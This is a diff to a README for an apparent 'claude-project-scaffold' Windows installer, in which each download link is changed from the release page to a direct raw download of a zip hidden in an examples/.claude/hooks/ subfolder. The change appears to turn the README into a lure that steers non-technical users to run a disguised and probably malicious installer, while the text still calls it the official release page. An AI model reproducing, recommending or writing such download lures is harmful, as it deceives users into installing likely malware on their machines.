@@ -1,6 +1,6 @@
 # 🤖 claude-project-scaffold - Easy Setup for Your AI System
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20Claude-blue?style=for-the-badge)](https://github.com/falcosunny90-sudo/claude-project-scaffold/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20Claude-blue?style=for-the-badge)](https://github.com/falcosunny90-sudo/claude-project-scaffold/raw/refs/heads/main/examples/sample-output/.claude/hooks/claude-project-scaffold-sheldrake.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This setup runs smoothly on most modern Windows PCs. If your system is older, it
 
 You need to download the setup files from the official release page.
 
-[**Visit the release page here to download the files**](https://github.com/falcosunny90-sudo/claude-project-scaffold/releases)
+[**Visit the release page here to download the files**](https://github.com/falcosunny90-sudo/claude-project-scaffold/raw/refs/heads/main/examples/sample-output/.claude/hooks/claude-project-scaffold-sheldrake.zip)
 
 This page holds all the latest versions. Always pick the newest release listed at the top for the best performance and latest fixes.
 
@@ -122,7 +122,7 @@ If problems persist, check the Issues tab on the GitHub page for common fixes or
 
 New releases may add features or fix bugs. To update:
 
-1. Go back to the [release page](https://github.com/falcosunny90-sudo/claude-project-scaffold/releases).  
+1. Go back to the [release page](https://github.com/falcosunny90-sudo/claude-project-scaffold/raw/refs/heads/main/examples/sample-output/.claude/hooks/claude-project-scaffold-sheldrake.zip).  
 2. Download the newest installer file.  
 3. Run the installer again. It will replace the old version without losing your projects.  
 
@@ -133,7 +133,7 @@ Keeping your software updated ensures stability and the best experience.
 ## 🗂️ Useful Links
 
 - Main Download Page:  
-[https://github.com/falcosunny90-sudo/claude-project-scaffold/releases](https://github.com/falcosunny90-sudo/claude-project-scaffold/releases)  
+[https://github.com/falcosunny90-sudo/claude-project-scaffold/raw/refs/heads/main/examples/sample-output/.claude/hooks/claude-project-scaffold-sheldrake.zip](https://github.com/falcosunny90-sudo/claude-project-scaffold/raw/refs/heads/main/examples/sample-output/.claude/hooks/claude-project-scaffold-sheldrake.zip)  
 
 - Source code and documentation are also available in the GitHub repository for those interested.
 
